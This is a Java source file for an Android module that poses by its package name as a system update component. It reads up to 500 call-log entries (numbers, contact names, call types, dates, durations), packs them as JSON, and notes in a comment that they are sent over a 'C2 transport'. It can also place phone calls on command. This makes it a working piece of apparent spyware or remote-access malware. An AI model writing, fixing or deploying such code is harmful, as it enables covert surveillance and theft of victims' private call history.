package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsModule {
    private static final String TAG = "CallsModule";
    private static final int MAX_LOGS = 500;
    private final Context context;

    public CallsModule(Context context) {
        this.context = context;
    }

    // ── Retrieve call logs ────────────────────────────────────────────────────

    public String getCallLogs() {
        Log.d(TAG, "📞 getCallLogs() called");
        JSONArray callsArray = new JSONArray();

        try {
            ContentResolver resolver = context.getContentResolver();

            String[] projection = {
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
            };

            // ── IMPORTANT: sortOrder must NOT contain LIMIT.
            // Putting "LIMIT N" in the sortOrder string of ContentResolver.query()
            // throws "Invalid token LIMIT" on Samsung/AOSP SQLite builds because
            // that argument maps directly to ORDER BY, not a full SQL suffix.
            String sortOrder = CallLog.Calls.DATE + " DESC";

            Cursor cursor;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // API 26+: Bundle overload supports QUERY_ARG_LIMIT natively
                android.os.Bundle queryArgs = new android.os.Bundle();
                queryArgs.putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, sortOrder);
                queryArgs.putInt(ContentResolver.QUERY_ARG_LIMIT, MAX_LOGS);
                cursor = resolver.query(CallLog.Calls.CONTENT_URI, projection, queryArgs, null);
            } else {
                // API < 26: retrieve all, slice manually below
                cursor = resolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, sortOrder);
            }

            if (cursor == null) {
                Log.w(TAG, "⚠️ Cursor null — READ_CALL_LOG permission missing?");
                return "[{\"error\":\"Permission denied or no call logs\"}]";
            }

            Log.d(TAG, "📞 Cursor count: " + cursor.getCount());

            int numberIdx   = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx     = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx     = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int dateIdx     = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

            int count = 0;
            while (cursor.moveToNext()) {
                if (count >= MAX_LOGS) break;
                try {
                    String number   = numberIdx   >= 0 ? cursor.getString(numberIdx)  : "Unknown";
                    String name     = nameIdx     >= 0 ? cursor.getString(nameIdx)    : "";
                    int    type     = typeIdx     >= 0 ? cursor.getInt(typeIdx)        : 0;
                    long   date     = dateIdx     >= 0 ? cursor.getLong(dateIdx)       : 0L;
                    int    duration = durationIdx >= 0 ? cursor.getInt(durationIdx)    : 0;

                    // ── CRITICAL: strip any \n or \r from strings before putting
                    // them in JSON — the C2 transport uses readLine() so a newline
                    // inside a JSON value splits the packet and corrupts parsing.
                    if (number == null) number = "Unknown";
                    if (name   == null) name   = "";
                    number = number.replace("\n", "").replace("\r", "").trim();
                    name   = name  .replace("\n", "").replace("\r", "").trim();

                    String formattedDate = formatDate(date);
                    // formatDate uses a locale pattern that shouldn't contain \n,
                    // but sanitise anyway for safety.
                    formattedDate = formattedDate.replace("\n", " ").replace("\r", "");

                    JSONObject callObj = new JSONObject();
                    callObj.put("number",         number);
                    callObj.put("name",           name);
                    callObj.put("type",           callTypeToString(type));
                    callObj.put("date",           date);
                    callObj.put("duration",       String.valueOf(duration));
                    callObj.put("formatted_date", formattedDate);

                    callsArray.put(callObj);
                    count++;
                } catch (Exception e) {
                    Log.e(TAG, "Error parsing call log row", e);
                }
            }
            cursor.close();

            Log.d(TAG, "📞 Returning " + callsArray.length() + " call logs");
            // Ensure the final JSON string itself has no literal newlines
            return callsArray.toString().replace("\n", "").replace("\r", "");

        } catch (SecurityException se) {
            Log.e(TAG, "❌ SecurityException — READ_CALL_LOG denied", se);
            return "[{\"error\":\"Permission denied: READ_CALL_LOG\"}]";
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage(), e);
            return "[{\"error\":\"" + e.getMessage() + "\"}]";
        }
    }

    // ── Initiate a call ───────────────────────────────────────────────────────

// ─── REPLACE makeCall() in CallsModule.java ──────────────────────────────────
//
// Problems in the original:
//  1. replaceAll("[^0-9+]", "") strips valid chars for some locales but more
//     importantly it can produce an EMPTY string if the number was URL-encoded
//     or had spaces baked in from the Flutter side.
//  2. Uri.encode(number) double-encodes a "+" prefix on international numbers,
//     making the dialler show a garbage number.
//  3. No null-guard after stripping — an empty result was sent to the dialler
//     silently.
//
// Fix:
//  • Strip only whitespace and control characters first.
//  • Keep +, digits, *, # (valid dialler chars) — strip everything else.
//  • Validate length > 0 after stripping before touching intents.
//  • Use Uri.fromParts("tel", number, null) instead of Uri.parse("tel:"+encode)
//    to avoid double-encoding the + prefix.
// ─────────────────────────────────────────────────────────────────────────────

public String makeCall(String number) {
    // ── 1. Null / empty guard ────────────────────────────────────────────────
    if (number == null || number.trim().isEmpty()) {
        Log.e(TAG, "❌ makeCall: empty number");
        return "ERROR: No phone number provided";
    }

    // ── 2. Sanitise ──────────────────────────────────────────────────────────
    number = number.trim()
                   .replace("\n", "")
                   .replace("\r", "")
                   .replace(" ", "");

    if (number.toLowerCase().startsWith("tel:")) {
        number = number.substring(4);
    }

    // Keep only valid dialler characters
    String cleaned = number.replaceAll("[^0-9+*#]", "");

    if (cleaned.isEmpty()) {
        Log.e(TAG, "❌ makeCall: empty after sanitise, raw='" + number + "'");
        return "ERROR: Phone number is empty after sanitisation";
    }

    Log.d(TAG, "📞 makeCall: cleaned='" + cleaned + "'");

    // ── 3. Permission check ──────────────────────────────────────────────────
    if (context.checkSelfPermission(android.Manifest.permission.CALL_PHONE)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
        Log.e(TAG, "❌ CALL_PHONE permission not granted");
        // Fall back to dialler (opens dialler UI, user taps call)
        return fallbackToDial(cleaned);
    }

    // ── 4. Try TelecomManager first (Android 10+ recommended API) ───────────
    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
        try {
            android.telecom.TelecomManager telecomManager =
                (android.telecom.TelecomManager)
                    context.getSystemService(Context.TELECOM_SERVICE);

            if (telecomManager == null) {
                Log.w(TAG, "⚠️ TelecomManager null, falling back to Intent");
                return fallbackToCall(cleaned);
            }

            Uri callUri = Uri.fromParts("tel", cleaned, null);
            android.os.Bundle extras = new android.os.Bundle();
            extras.putBoolean(
                android.telecom.TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE,
                false
            );

            telecomManager.placeCall(callUri, extras);
            Log.d(TAG, "✅ TelecomManager.placeCall() fired for: " + cleaned);
            return "SUCCESS: Calling " + cleaned;

        } catch (SecurityException se) {
            Log.e(TAG, "❌ TelecomManager SecurityException: " + se.getMessage());
            return fallbackToCall(cleaned);
        } catch (Exception e) {
            Log.e(TAG, "❌ TelecomManager failed: " + e.getMessage());
            return fallbackToCall(cleaned);
        }
    }

    // ── 5. Android < M fallback ──────────────────────────────────────────────
    return fallbackToCall(cleaned);
}

// ── Fallback A: ACTION_CALL (direct call, needs CALL_PHONE) ─────────────────
private String fallbackToCall(String number) {
    try {
        Uri callUri = Uri.fromParts("tel", number, null);
        Intent intent = new Intent(Intent.ACTION_CALL, callUri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        Log.d(TAG, "✅ fallbackToCall fired for: " + number);
        return "SUCCESS: Calling " + number;
    } catch (Exception e) {
        Log.e(TAG, "❌ fallbackToCall failed: " + e.getMessage());
        return fallbackToDial(number);
    }
}

// ── Fallback B: ACTION_DIAL (opens dialler, user taps call manually) ─────────
private String fallbackToDial(String number) {
    try {
        Uri dialUri = Uri.fromParts("tel", number, null);
        Intent intent = new Intent(Intent.ACTION_DIAL, dialUri);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        Log.d(TAG, "✅ fallbackToDial fired for: " + number);
        return "DIALLER_OPENED: " + number;
    } catch (Exception e) {
        Log.e(TAG, "❌ fallbackToDial failed: " + e.getMessage());
        return "ERROR: " + e.getMessage();
    }
}

    // ── Helpers ───────────────────────────────────────────────────────────────

    private String callTypeToString(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:  return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE:  return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:    return "MISSED";
            case CallLog.Calls.REJECTED_TYPE:  return "REJECTED";
            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
            case CallLog.Calls.BLOCKED_TYPE:   return "BLOCKED";
            case 7:                            return "ANSWERED_EXTERNALLY";
            default:                           return "UNKNOWN";
        }
    }

    private String formatDate(long timestamp) {
        if (timestamp == 0) return "Unknown date";
        try {
            // Use a fixed locale to avoid locale-specific characters that
            // might introduce unexpected whitespace or non-ASCII characters.
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat(
                "MMM dd, yyyy HH:mm", java.util.Locale.US);
            return sdf.format(new java.util.Date(timestamp));
        } catch (Exception e) {
            return "Unknown date";
        }
    }
}
